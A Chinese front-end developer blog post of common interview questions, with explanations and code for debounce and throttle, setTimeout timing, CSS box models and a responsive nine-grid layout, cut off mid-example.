<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><link rel=manifest href=/blog/manifest.json>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="white"/>
<link rel="apple-touch-icon" href="/blog/images/public/apple-touch-icon.png">



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="QpR2UtOlwMERxir6cPqI74sPMIvl4B0KbVZgg14OELA" />













  
  
  <link href="/blog/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/blog/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/blog/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Other," />





  <link rel="alternate" href="/blog/atom.xml" title="Pimi's Blog" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=5.1.0" />






<meta name="description" content="前端一些常见的面试题，面试前复习强烈推荐">
<meta name="keywords" content="Other">
<meta property="og:type" content="article">
<meta property="og:title" content="前端常见的面试题">
<meta property="og:url" content="http://pimichen.com/blog/other/前端常见的面试题.html">
<meta property="og:site_name" content="Pimi&#39;s Blog">
<meta property="og:description" content="前端一些常见的面试题，面试前复习强烈推荐">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_debounce.gif">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_throttle.gif">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_box_model2.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_box_model1.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_bfc3.png">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_bfc1.png">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_bfc2.png">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_line.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/defer_async.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_object_result.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_object_result2.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js__proto__.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_prototype2.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_prototype.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_prototype_result.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_prototype3.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_prototype4.png">
<meta property="og:image" content="http://pimichen.com/blog/images/other/other-scope-level.png">
<meta property="og:image" content="http://pimichen.com/blog/images/other/other-mvc.png">
<meta property="og:image" content="http://pimichen.com/blog/images/other/other-mvvm.png">
<meta property="og:image" content="http://pimichen.com/blog/images/vue/vue.png">
<meta property="og:image" content="http://pimichen.com/blog/images/vue/vuex.png">
<meta property="og:image" content="http://pimichen.com/blog/images/tools/string_newstring.png">
<meta property="og:image" content="http://pimichen.com/blog/images/css/css_box.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_zhizhen1.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_zhizhen2.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_zhizhen3.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_zhizhen4.jpg">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/browser_webkit.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/browser_gecko.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_performance_timing.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_performace_getEntries1.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_performace_getEntries2.png">
<meta property="og:image" content="http://pimichen.com/blog/images/javascript/js_error_control.png">
<meta property="og:updated_time" content="2020-02-28T16:00:00.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="前端常见的面试题">
<meta name="twitter:description" content="前端一些常见的面试题，面试前复习强烈推荐">
<meta name="twitter:image" content="http://pimichen.com/blog/images/javascript/js_debounce.gif">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/blog/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":true},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '7U5GLOOLPQ',
      apiKey: '217b43ed2d3cb495895c71b272d78d13',
      indexName: 'pimi_blog',
      hits: {"per_page":10},
      labels: {"input_placeholder":"搜索...","hits_empty":"没有查到与「${query}」相关的内容","hits_stats":"${hits} 条相关记录，共耗时 ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://pimichen.com/blog/other/前端常见的面试题.html"/>







<style>
.input-label{
  vertical-align:middle;
  font-size:18px;
  height: 30px;
  line-height: 1em;
}
.input-secret{
  width:120px;
  height: 30px;
  line-height: 30px;
  font-size:18px;
  border: 1px solid #ccc;
  vertical-align:middle;
  outline:none;
  padding:0 5px;
  box-sizing:border-box;
  border-radius:5px;
  -webkit-appearance: none;
}
.submit-btn{
  display:inline-block;
  height: 30px;
  line-height:1em;
  font-size:18px;
  text-align:center;
  margin-left:10px;
  border: 1px solid #ccc;
  background-color:transparent;
  vertical-align:middle;
  border-radius:5px;
}
.hidden-box{
  display:none;
}
</style>
<script>
window.onload = function(){
  var secretBox = document.getElementById('secret-box');
  if (secretBox === null) return;
  var contentNode = document.getElementsByClassName('post-body')[0];
  var blogNodes = contentNode.children;
  var asideNavTitle = document.getElementsByClassName('sidebar-nav-toc')[0];
  var asideNavContent = document.getElementsByClassName('post-toc-content')[0];
  asideNavTitle.style.display = 'none';
  asideNavContent.style.display = 'none';
  for(var i = 0; i < blogNodes.length; i++) {
    if (blogNodes[i].getAttribute('id') !== 'secret-box') {
      blogNodes[i].style.display = 'none';
    }
  }

  var inputSecret = document.getElementById('input-secret');
  var submitBtn = document.getElementById('submit-btn');
  var blogSecret = 7728828;

  submitBtn.onclick = activeEvent;
  inputSecret.onkeydown = function (event) {
    event = event || window.event;
    if (event.keyCode == 13) {
      activeEvent();
    }
  }
  function activeEvent () {
    if (inputSecret.value.replace(/\s+/g, '') == blogSecret) {
      for(var i = 0; i < blogNodes.length; i++) {
        blogNodes[i].style.display = 'block';
      }
      asideNavTitle.style.display = 'inline-block';
      asideNavContent.style.display = 'block';
      secretBox.style.display = 'none';
    } else{
      alert('密码错误，请重试！');
    }
  }
}
</script>


  <title> 前端常见的面试题 | Pimi's Blog </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-100562378-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?6818b43932ba418bf608f04dbecd5258";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>










  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/blog/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Pimi's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">A lazy youth, a lousy age.</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/blog/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/blog/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/blog/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/blog/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-commonweal">
          <a href="/blog/404.html" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            公益
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocapitalize="off" autocomplete="off" autocorrect="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://pimichen.com/blog/blog/other/前端常见的面试题.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Pimi Chen">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/blog/images/mine/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pimi's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                前端常见的面试题
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-29T00:00:00+08:00">
                2019-04-29
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2020-02-29T00:00:00+08:00">
                2020-02-29
              </time>
            

            
          </span>

          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span>阅读次数</span>
            <span class="busuanzi-value" id="busuanzi_value_page_pv" >1</span>
            </span>
          

          

          
              <div class="post-description">
                  前端一些常见的面试题，面试前复习强烈推荐
              </div>
          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <!-- <div class="secret-box" id="secret-box">
  <label for="input-secret" class="input-label">请输入密码：</label><input type="password" class="input-secret" id="input-secret" /><button class="submit-btn" id="submit-btn">提交</button>
</div> -->
<h2 id="常见的前端算法题"><a href="#常见的前端算法题" class="headerlink" title="常见的前端算法题"></a>常见的前端算法题</h2><blockquote>
<p>见：<a href="/blog/javascript/前端算法集合.html">前端算法集合</a></p>
</blockquote>
<hr>
<h2 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h2><blockquote>
<p>参考：<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">掘金 彻底弄懂 JavaScript 执行机制</a></p>
</blockquote>
<hr>
<h2 id="算法的时间与空间复杂度"><a href="#算法的时间与空间复杂度" class="headerlink" title="算法的时间与空间复杂度"></a>算法的时间与空间复杂度</h2><blockquote>
<p>参考：<a href="https://zhuanlan.zhihu.com/p/50479555" target="_blank" rel="noopener">知乎 算法的时间与空间复杂度</a></p>
</blockquote>
<p>常用的时间复杂度（从上只下越来越复杂）：</p>
<ul>
<li>常数阶 O(1)</li>
<li>对数阶 O(logN)</li>
<li>线性阶 O(n)</li>
<li>线性对数阶 O(n * logN)</li>
<li>平方阶 O(n^2)</li>
<li>立方阶 O(n^3)</li>
<li>k次方阶 O(n^k)</li>
<li>指数阶 O(2^n)</li>
</ul>
<p>常用的空间复杂度：</p>
<ul>
<li>常数阶 O(1)</li>
<li>线性阶 O(n)</li>
<li>平方阶 o(n^2)</li>
</ul>
<hr>
<h2 id="SetTimeout的时间什么不准"><a href="#SetTimeout的时间什么不准" class="headerlink" title="SetTimeout的时间什么不准"></a>SetTimeout的时间什么不准</h2><p>js是单线程，先执行同步主线程，再执行异步任务队列。主线程的耗时会影响setTimeout的执行时间。它表述的是一个最小延迟时间，而非精准时间。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// xxx</span></span><br><span class="line">&#125;, <span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<p>根据HTML5的规范，定时器被多次嵌套后，最小为4毫秒。</p>
<p>另外，setTimeout 本身也可以通过递归实现 setInterval 的功能，setTimeout 和 setInterval 都有可能出现丢帧现象，原因时步调和 requestAnimationFrame 的步调不一致，requestAnimationFrame 是按照屏幕刷新率来进行更新的，一旦两者时间错开，则肯能出现丢帧现象。</p>
<hr>
<h2 id="函数防抖和函数节流"><a href="#函数防抖和函数节流" class="headerlink" title="函数防抖和函数节流"></a>函数防抖和函数节流</h2><blockquote>
<p>参考：<a href="https://blog.csdn.net/qq_41000891/article/details/82733532" target="_blank" rel="noopener">csdn 前端性能——JS的防抖和节流</a><br>其他：<a href="https://segmentfault.com/a/1190000016261602" target="_blank" rel="noopener">segmentfault 7分钟理解JS的节流、防抖及使用场景</a></p>
</blockquote>
<p>函数节流和函数防抖，两者都是优化高频率执行js代码的一种手段。</p>
<h3 id="函数防抖-debounce"><a href="#函数防抖-debounce" class="headerlink" title="函数防抖 debounce"></a>函数防抖 debounce</h3><p><strong>函数防抖</strong> 是指当持续触发事件时，一定时间段内没有再触发事件，事件处理函数才会执行一次，如果设定的时间到来之前，又一次触发了事件，就重新开始延时。比如生活中的坐公交，就是一定时间内，如果有人陆续刷卡上车，司机就不会开车。只有别人没刷卡了，司机才开车。</p>
<p>如下例，持续触发scroll事件时，并不执行handle函数，当1000毫秒内没有触发scroll事件时，才会延时触发scroll事件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timeout = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 此处只执行一次</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// var context = this</span></span><br><span class="line">        <span class="comment">// var args = arguments</span></span><br><span class="line">        <span class="comment">// 此处会一直被执行</span></span><br><span class="line">        clearTimeout(timeout);</span><br><span class="line">        <span class="comment">// fn.apply(context, args) // 将上下文和参数传给handle</span></span><br><span class="line">        timeout = setTimeout(fn, delay);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 滚动事件</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, debounce(handle, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：</span></span><br><span class="line"><span class="comment">// window.addEventListener('scroll', debounce);</span></span><br><span class="line"><span class="comment">// window.addEventListener('scroll', function () &#123;debounce(handle, 1000) &#125;);</span></span><br><span class="line"><span class="comment">// 这两种均会导致debounce一直被执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 另外addEventListener第二个参数还支持传入object：</span></span><br><span class="line"><span class="comment">// window.addEventListener('scroll', &#123; handleEvent: function () &#123;&#125; &#125;);</span></span><br></pre></td></tr></table></figure>
<p>运行结果如下：<br><img src="../images/javascript/js_debounce.gif" title="函数防抖"></p>
<h3 id="函数节流-throttle"><a href="#函数节流-throttle" class="headerlink" title="函数节流 throttle"></a>函数节流 throttle</h3><p><strong>函数节流</strong> 是指当持续触发事件时，保证一定时间段内只调用一次事件处理函数。通俗解释就比如我们水龙头放水，阀门一打开，水哗哗的往下流，秉着勤俭节约的优良传统美德，我们要把水龙头关小点，最好是如我们心意按照一定规律在某个时间间隔内一滴一滴的往下滴。</p>
<p>如下例，持续触发scroll事件时，并不立即执行handle函数，每隔1000毫秒才会执行一次handle函数。</p>
<ul>
<li><p>定时器方案</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span>(<span class="params">fn, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// var context = this;</span></span><br><span class="line">        <span class="comment">// var args = arguments;</span></span><br><span class="line">        <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">            timer = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                fn();</span><br><span class="line">                <span class="comment">// fn.apply(context, args);</span></span><br><span class="line">                timer = <span class="literal">null</span>;</span><br><span class="line">            &#125;, wait);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, throttle(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>时间戳方案</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> throttle = <span class="function"><span class="keyword">function</span>(<span class="params">fn, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> prev = <span class="built_in">Date</span>.now();</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// var context = this;</span></span><br><span class="line">        <span class="comment">// var args = arguments;</span></span><br><span class="line">        <span class="keyword">var</span> now = <span class="built_in">Date</span>.now();</span><br><span class="line">        <span class="keyword">if</span> (now - prev &gt;= wait) &#123;</span><br><span class="line">            fn();</span><br><span class="line">            <span class="comment">// fn.apply(context, args);</span></span><br><span class="line">            prev = <span class="built_in">Date</span>.now();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">Math</span>.random());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'scroll'</span>, throttle(handle, <span class="number">1000</span>));</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>运行结果如下：<br><img src="../images/javascript/js_throttle.gif" title="函数节流"></p>
<hr>
<h2 id="IE盒模型和标准盒模型"><a href="#IE盒模型和标准盒模型" class="headerlink" title="IE盒模型和标准盒模型"></a>IE盒模型和标准盒模型</h2><h3 id="IE盒模型"><a href="#IE盒模型" class="headerlink" title="IE盒模型"></a>IE盒模型</h3><p><img src="../images/css/css_box_model2.jpg" title="IE盒模型"><br>IE 盒模型包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，width 包含了 <code>content</code>、<code>border</code> 和 <code>pading</code>，即使用 <code>border</code>、<code>padding</code> 不会撑大 width。</p>
<h3 id="标准-W3C-盒模型"><a href="#标准-W3C-盒模型" class="headerlink" title="标准(W3C)盒模型"></a>标准(W3C)盒模型</h3><p><img src="../images/css/css_box_model1.jpg" title="标准盒模型"><br>W3C 盒子模型包括 <code>margin</code>、<code>border</code>、<code>padding</code>、<code>content</code>，width 不包含 <code>border</code> 和 <code>pading</code>，即使用 <code>border</code>、<code>padding</code> 会撑大 width。</p>
<p>例如，一个元素的样式如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>则 <strong>W3C 盒模型</strong>下：<br>盒模型占用的宽度为：<code>20*2 + 10*2 + 5*2 + 200 = 270px;</code><br>盒子实际宽度为：<code>10*2 + 5*2 + 200 = 230px;</code></p>
<p><strong>IE 盒模型</strong>下：<br>盒模型占用的宽度为：<code>20*2 + 200 = 240px;</code><br>盒子实际宽度为：<code>200px;</code></p>
<p>实际开发过程中，我们经常会使用 <code>box-sizing</code> 来改变盒模型，常见的有：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: content-box; <span class="comment">/* 默认W3C盒模型，width只极算content */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 实际开发过程中会经常使用下面这种 */</span></span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 使用IE盒模型，width计算到border，这种模式下先固定宽度，然后padding和border不会对元素产生影响 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="css-实现响应式的九宫格布局"><a href="#css-实现响应式的九宫格布局" class="headerlink" title="css 实现响应式的九宫格布局"></a>css 实现响应式的九宫格布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>5<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>6<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>8<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>9<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用百分比实现：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">* &#123; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>; <span class="attribute">margin</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box; <span class="comment">/* 重要 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">1px</span> solid <span class="number">#00</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">100px</span>; <span class="comment">/* 左右各间距100px */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.main</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">33.33%</span>;</span><br><span class="line">  <span class="comment">/* padding设置百分比时，是根据父级的宽度来计算的 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">16.67%</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#E78326</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3%</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="comment">/* 浮动自动换行，也可以给main设置flex替代 */</span></span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 内部div增加居中的文字 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span 